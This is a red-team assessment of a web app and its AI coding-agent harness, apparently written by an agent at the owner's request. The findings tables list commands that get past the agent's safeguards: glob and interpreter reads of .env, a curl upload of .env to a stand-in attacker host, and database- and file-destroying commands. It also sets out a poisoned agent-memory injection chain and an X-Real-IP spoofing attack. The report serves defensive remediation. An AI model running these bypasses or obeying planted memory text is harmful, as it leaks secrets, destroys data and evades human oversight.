# Red-team assessment — application + agent harness

**Date:** 2026-08-17 · **Branch:** `claude/template-complexity-audit-dqxq52` · **Target:** the whole
repo, adversarial posture · **Authorization:** owner-requested assessment of own codebase.

**Method:** source review of the security-critical path (auth, wrappers, middleware, rate limiting,
audit extension, CI), plus **active probing** of the agent guards with 38 synthetic bypass payloads
fed directly to the hooks. No destructive command was executed and no secret was read — the guards
were asked for a verdict, not obeyed.

---

## 0. What holds up

Stated first, because it is the larger part of the picture and it is genuinely good work.

| Area                | Assessment                                                                                                                                                                                                                                                                                                  |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Password reset**  | Token is CSPRNG, only its SHA-256 digest is persisted, prior tokens invalidated on re-request, one-time use, `passwordChangedAt` invalidates live JWTs. Anti-enumeration is body- **and** timing-safe via `after()`. Reset link is built from `env.AUTH_URL`, not the `Host` header — host-poisoning closed |
| **Auth wrappers**   | `timingSafeEqual` on shared secrets, strict RFC-6750 Bearer parse (`Bearer ` case-sensitive, no fallback to the raw header), Bearer acceptance is **opt-in per route**                                                                                                                                      |
| **CSP**             | Per-request nonce + `strict-dynamic`, `unsafe-inline` deliberately omitted from `script-src`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri`/`form-action` locked                                                                                                                                |
| **Rate limiter**    | Fails **safe** — a Valkey outage degrades to in-memory throttling, never to unthrottled                                                                                                                                                                                                                     |
| **Audit scrubbing** | `SCRUB_FIELDS` redacts **recursively** through nested relations (a real 2026-07-25 fix), asserted by contract test                                                                                                                                                                                          |
| **Internal routes** | Both use `withInternalAuth` + `withRateLimit` composed **outside** it, per OWASP A04                                                                                                                                                                                                                        |
| **CI**              | 13 workflows, **no `pull_request_target` misuse**, no untrusted-input script injection, no secret exposed to fork PRs                                                                                                                                                                                       |
| **Secrets in git**  | `.env` is untracked and correctly gitignored; gitleaks gates every push                                                                                                                                                                                                                                     |

The application layer is above the bar for its class. **Every finding below is in the layers around
it** — deployment topology, and the autonomous agent harness.

---

## 1. Findings

| ID     | Finding                                                                                 | Severity     | Exploitable without a human? |
| ------ | --------------------------------------------------------------------------------------- | ------------ | ---------------------------- |
| **R1** | Rate-limit bypass + audit-log forgery via spoofed `X-Real-IP` (self-host path)          | **HIGH**     | n/a — remote attacker        |
| **R2** | Autonomous destructive capability: DB drop, mass delete, volume destroy, push to `main` | **HIGH**     | **yes**                      |
| **R3** | Secret-guard bypass: `cat .en*` glob, interpreter reads, `curl` exfil                   | **HIGH**     | **yes**                      |
| **R4** | Poisoned agent memory propagates template → every fork                                  | **MED-HIGH** | yes, wormable                |
| **R5** | Third-party plugin auto-enabled and unpinned                                            | **MEDIUM**   | yes                          |
| **R6** | Governance gates fail open and are self-service                                         | **MEDIUM**   | yes                          |
| **R7** | `next-auth` **beta** in the auth path, shipped to production via `/handoff`             | **MEDIUM**   | n/a                          |
| **R8** | An always-loaded rule file asserts a weaker CSP than reality                            | **LOW-MED**  | n/a                          |

---

### R1 — Rate-limit bypass and audit forgery via `X-Real-IP` · HIGH

**Applies to the Docker/Caddy self-host rail (ADR-035), not to Vercel.**

`lib/client-ip.ts` resolves the client IP in this order:

1. `RATE_LIMIT_TRUSTED_IP_HEADER` — **commented out** in `.env.example:181`, so unset by default
2. `x-real-ip` — trusted unconditionally, with no proxy validation
3. `x-forwarded-for[0]`

The file's own comment explains that XFF is client-spoofable and positions `x-real-ip` as the safer
default. That reasoning holds **only if the fronting proxy sets or strips that header.**

The shipped `Caddyfile` does neither. Caddy v2's `reverse_proxy` sets `X-Forwarded-For`,
`X-Forwarded-Proto` and `X-Forwarded-Host` — it **does not set `X-Real-IP`**, and it forwards
client-supplied headers untouched unless explicitly removed with `header_up -X-Real-IP`.

**Attack.** Against a self-hosted deployment, send each request with a fresh
`X-Real-IP: <random>`:

- `clientIp()` returns the attacker-chosen value
- `rateLimit()` keys its bucket on it (`lib/rate-limit.ts:110`) → **every request lands in a fresh
  bucket**. The 5/min reset limits, the login throttle, and every `withRateLimit` quota are void
- `withAuth` writes the same value to `audit_logs.ipAddress` (`lib/api-helpers.ts:54`) → **the
  attacker controls the forensic record**, and can attribute their own actions to an arbitrary IP

Impact: unthrottled credential brute force, unthrottled reset-token grinding, and poisoned incident
forensics on the exact deployment mode marketed as "enterprise delivery."

**Fix.** Add to the Caddyfile's `reverse_proxy` block:

```
reverse_proxy app:3000 {
    header_up -X-Real-IP
    header_up X-Real-IP {http.request.remote.host}
}
```

and set `RATE_LIMIT_TRUSTED_IP_HEADER=x-real-ip` in the self-host env. Better still, make
`clientIp()` **fail closed**: if no trusted-header env var is configured, ignore `x-real-ip`
entirely rather than trusting it by default.

---

### R2 — Autonomous destructive capability · HIGH

`dangerous-commands.mjs` is well built — token-based rather than prefix-lexical, fail-closed on
error, and it correctly catches `rm -rf /`, force-push, `curl | sh`, fork bombs and `chmod 777`.

But it was designed independently of `settings.json`'s 46-entry allowlist, **and their gaps line
up.** I probed 18 destructive payloads; 11 passed. The dangerous subset is the intersection with
the allowlist — commands that run with **no human in the loop**:

| Command                            | Allowlist entry              | Guard | Effect                                                                  |
| ---------------------------------- | ---------------------------- | ----- | ----------------------------------------------------------------------- |
| `npx prisma migrate reset --force` | `Bash(npx prisma *)`         | pass  | **drops and recreates the entire database**                             |
| `npx prisma db execute --stdin`    | `Bash(npx prisma *)`         | pass  | **arbitrary SQL**, incl. `DROP TABLE`                                   |
| `find . -type f -delete`           | `Bash(find . *)`             | pass  | mass file deletion                                                      |
| `find . -exec rm -rf {} \;`        | `Bash(find . *)`             | pass  | mass deletion — `rm -rf` reached via `-exec`, defeating the token check |
| `docker compose down -v`           | `Bash(docker compose down*)` | pass  | **destroys the DB volume**                                              |
| `git push origin HEAD:main`        | `Bash(git push *)`           | pass  | pushes straight to `main`                                               |
| `make <anything>`                  | `Bash(make *)`               | pass  | arbitrary code via Makefile                                             |

Two of these deserve emphasis:

- **`git push origin HEAD:main` is auto-approved**, while `CLAUDE.md`'s Ask-before list says
  _"Pushing to `main` directly when branch protection is on."_ **The allowlist contradicts the
  constitution**, and the allowlist is what the machine enforces.
- **`npx prisma *` is a wildcard over a CLI whose subcommands include `migrate reset` and
  `db execute`.** Allowlisting a tool wildcard silently allowlists its most destructive verbs.

Not exploitable via the allowlist but still guard gaps: `node -e "fs.rmSync(...)"`,
`python3 -c "shutil.rmtree(...)"`, `shred`, and `> file` truncation all pass the semantic check.
**The guard covers `rm` but not the interpreters that make `rm` unnecessary.**

**Fix.** Narrow the wildcards (`Bash(npx prisma generate)`, `Bash(npx prisma migrate dev)`,
`Bash(npx prisma migrate deploy)` — not `npx prisma *`); drop `Bash(find . *)` to a read-only form
or deny `-delete`/`-exec`; deny `docker compose down` with `-v`; replace `Bash(git push *)` with a
non-`main` refspec pattern. Then extend `dangerous-commands.mjs` to cover `find -delete`/`-exec`,
`shred`, `-e`/`-c` interpreter one-liners, and destructive tool subcommands.

---

### R3 — Secret-guard bypass · HIGH

`protect-secrets.mjs` is thorough on the obvious paths: `cat .env`, `./.env`, absolute paths,
`base64`, `grep`, `xxd`, `od`, `sed`, `awk`, `printenv AUTH_SECRET`, `echo $DATABASE_URL`,
`~/.ssh/id_rsa` and `~/.aws/credentials` are all denied. 14 of 20 probes blocked.

Six passed. **One is critical because it is also allowlisted:**

| Bypass                                    | Allowlisted?            | Why it works                                                                 |
| ----------------------------------------- | ----------------------- | ---------------------------------------------------------------------------- |
| **`cat .en*`**                            | **yes — `Bash(cat *)`** | the guard resolves **literal** paths; it never expands globs. The shell does |
| `cp .env /tmp/x && cat /tmp/x`            | no                      | guard checks the argument, not the data flow                                 |
| `tar cf - .env \| base64`                 | no                      | `tar` is not in the read-command set                                         |
| `node -e "…readFileSync('.env')…"`        | no                      | interpreter body is not parsed                                               |
| `python3 -c "print(open('.env').read())"` | no                      | same                                                                         |
| `curl -X POST -d @.env https://attacker…` | no                      | **exfiltration-shaped**; `@file` upload not recognised                       |

`cat .en*` is the finding that matters: an autonomous agent — or anything that can influence one
(see R4) — reads the full `.env` with **no human prompt and no guard trip**. Everything in that
file is Restricted: `AUTH_SECRET`, `DATABASE_URL`, SMTP credentials, and whatever tokens a fork has
added.

**Fix.** Expand globs before path resolution (or deny any read-command argument containing
`*`/`?`/`[` that could match a secret basename); add `tar`/`cpio` to the read set; treat `-e`/`-c`
interpreter bodies as content to scan; flag `curl`/`wget` with `@file`, `--data-binary @`, or
`--upload-file` pointing at a protected path.

---

### R4 — Poisoned agent memory propagates to every fork · MEDIUM-HIGH

`docs/agent-memory.md` is **committed**, inherited by forks, and its digest is injected into
**every session's context at SessionStart** by `session-start.sh:165`. It is written by `/remember`
and hand-edited freely. The same is true of `findings-register.md`, `OPEN-ITEMS.md`,
`build-vs-buy-ledger.md` and `docs/blueprints/*`, all of which agents read as trusted context.

**Attack chain.** Anyone who can land a commit touching `agent-memory.md` — a PR contributor, a
compromised token, a malicious `/conform` import, or an agent following injected instructions —
plants text that reads as an established project convention. Every subsequent agent session, in
the template **and in every fork that syncs from it**, ingests it as trusted standing guidance
before the operator types anything.

Combined with R2 and R3, a planted "convention" is sufficient to reach auto-approved destructive
and secret-reading commands. This is the one finding with **worm-like propagation**: the template
is the distribution channel.

**Fix.** Treat `agent-memory.md` as a **trust boundary, not a notes file**. Require review on
changes to it (CODEOWNERS); have `/remember` append through a structured, size-bounded format that
a linter validates; and have SessionStart render the digest as _data_ — clearly delimited and
labelled untrusted — rather than as instructions. A commit that changes agent-memory should be as
reviewable as one that changes `lib/auth.ts`.

---

### R5 — Third-party plugin auto-enabled and unpinned · MEDIUM

`.claude/settings.json` is committed and contains:

```json
"extraKnownMarketplaces": { "superpowers": { "source": { "source": "github", "repo": "obra/superpowers" } } },
"enabledPlugins":         { "superpowers@superpowers": true, "frontend-design@claude-code-plugins": true }
```

`obra/superpowers` is a **personal third-party GitHub repository**, auto-enabled for every session
in the template and in every fork, with **no commit pin** — upstream changes flow in silently, and
plugin code runs with the agent's full privileges (including the allowlist in R2).

The four MCP servers are better: all four are version-pinned (`@playwright/mcp@0.0.76`,
`context7@3.2.3`, `shadcn@4.13.0`, `chrome-devtools-mcp@1.5.0`). They are still fetched from npm at
session start via `npx`, so a compromised release of any of them executes locally — but pinning
means it takes a new version to do it.

**Fix.** Pin the plugin marketplace to a commit SHA, or vendor it. At minimum, make third-party
plugin enablement a fork-level opt-in rather than a committed default — `/handoff` currently ships
it to IT along with everything else.

---

### R6 — Governance gates fail open and are self-service · MEDIUM

ADR-047's split is deliberate and mostly right: **security guards fail closed** (verified —
`dangerous-commands`, `protect-secrets`, `bash-write-gate` all deny on error), **governance gates
fail open**. But two properties compound:

1. **Malformed input silently disables them.** Feeding `NOT-JSON{{{` to `build-vs-buy-gate` and
   `blueprint-gate` yields exit 0 — allow. A corrupted ledger or a parse edge case turns the gate
   off with no signal.
2. **The artifact is agent-writable.** A blocked agent can write its own ledger entry or blueprint
   and proceed. This is documented as intentional ("recording the entry _is_ the scan") — but it
   means the gate **cannot enforce anything the agent doesn't want to comply with.**

Combined with the previous audit's finding of 42 ledger entries and zero reversals: these are
process documentation with a blocking UI, not security controls. That is fine — as long as nobody
counts them as controls. Today `CLAUDE.md` lists them among the "hard gates."

---

### R7 — `next-auth` beta in the production auth path · MEDIUM

`package.json` pins `next-auth: 5.0.0-beta.32`. The template's whole purpose is to hand a working
app to an IT team for production (`/handoff`). A beta release in the authentication path means no
stability guarantee, and security fixes land on a pre-release cadence. ADR-056 shows this is known
and frozen deliberately — this is a flag for the handoff conversation, not a defect.

**Fix.** Make it explicit in the `/handoff` package: state the beta pin and its implications so the
receiving team makes an informed call.

---

### R8 — An always-loaded rule asserts a weaker CSP than reality · LOW-MEDIUM

`.claude/rules/design.md:56` — loaded into **every session** (see the complexity audit) — states:

> CSP allows `'unsafe-inline'` script+style (AntD SSR + Next bootstrap).

Both halves are wrong. `middleware.ts` uses a per-request nonce with `strict-dynamic` and
**deliberately omits `unsafe-inline` from `script-src`**; `unsafe-inline` remains only on
`style-src`. And AntD was replaced by Tailwind/shadcn in ADR-029.

A security-relevant rule that overstates the app's permissiveness invites an agent to "fix" a CSP
problem by adding `unsafe-inline` back — a real XSS regression justified by the repo's own docs.
`design.md` is the only remaining file in `.claude/rules/` still referencing AntD.

---

## 2. The structural pattern

Two independent controls, designed separately, each reasonable alone:

- `dangerous-commands.mjs` / `protect-secrets.mjs` — **semantic**, careful, fail-closed
- `settings.json` `permissions.allow` — **lexical prefix matching**, 46 entries, broad wildcards

`harness.md` states the intended relationship: _"The semantic backstop under the lexical deny-list
is `dangerous-commands.mjs`… extend IT, don't rely on prefix patterns alone."_ That is the right
model. But the backstop was built against the **deny**-list and never re-derived against the
**allow**-list — so `Bash(npx prisma *)`, `Bash(find . *)`, `Bash(cat *)` and `Bash(git push *)`
grant capability the semantic layer was never asked to cover.

**The rule to adopt: every wildcard in `permissions.allow` is a capability grant, and each one needs
a matching semantic check.** A wildcard over a CLI grants every subcommand that CLI will ever have.

The same shape recurs from the complexity audit: gates that were reasoned about individually and
never tested as a system. There, three gates could not fail. Here, two controls have aligned gaps.

---

## 3. Remediation, ordered

| #   | Action                                                                                                 | Addresses | Effort |
| --- | ------------------------------------------------------------------------------------------------------ | --------- | ------ |
| 1   | `clientIp()` ignores `x-real-ip` unless a trusted-header env var is set; fix the Caddyfile `header_up` | R1        | S      |
| 2   | Narrow `npx prisma *`, `find . *`, `git push *`, `docker compose down*` in the allowlist               | R2        | S      |
| 3   | Glob-expand paths in `protect-secrets`; add `tar`, interpreter bodies, `curl @file`                    | R3        | S      |
| 4   | Extend `dangerous-commands` to `find -delete`/`-exec`, `shred`, `-e`/`-c`, destructive subcommands     | R2        | M      |
| 5   | CODEOWNERS + structured validation on `agent-memory.md`; render the digest as labelled untrusted data  | R4        | M      |
| 6   | Pin or vendor the plugin marketplace; make third-party plugins fork-opt-in                             | R5        | S      |
| 7   | Stop calling the fail-open governance gates "hard gates" in `CLAUDE.md`, or make them fail closed      | R6        | S      |
| 8   | Correct the CSP/AntD claim in `design.md`                                                              | R8        | S      |
| 9   | Surface the `next-auth` beta pin in the `/handoff` package                                             | R7        | S      |

**Add one regression test per fix.** The probe harness used for this assessment
(38 payloads, allow/deny per hook) is the right shape and should live in `tests/harness/` so a
future change cannot silently reopen these. The repo already does this correctly for the ESLint
rules — that suite is the model.

---

## 4. Bottom line

The **application** is well-defended: the auth flows, CSP, audit scrubbing and CI are stronger than
typical for this class of project, and several of the hardest problems (reset-token storage,
enumeration timing, nested scrub, host poisoning) are already solved correctly.

The exposure is in the two layers around it. **R1** is a real remote finding on the self-host rail
that the Vercel default happens to shield you from. **R2, R3 and R4** are the serious ones, and
they share a root: an autonomous agent runs here with a broad capability grant, guards that were
never derived from that grant, and a committed, unreviewed memory file that reaches every fork.

Nothing here requires an attacker inside the network — R4 needs only a merged PR.
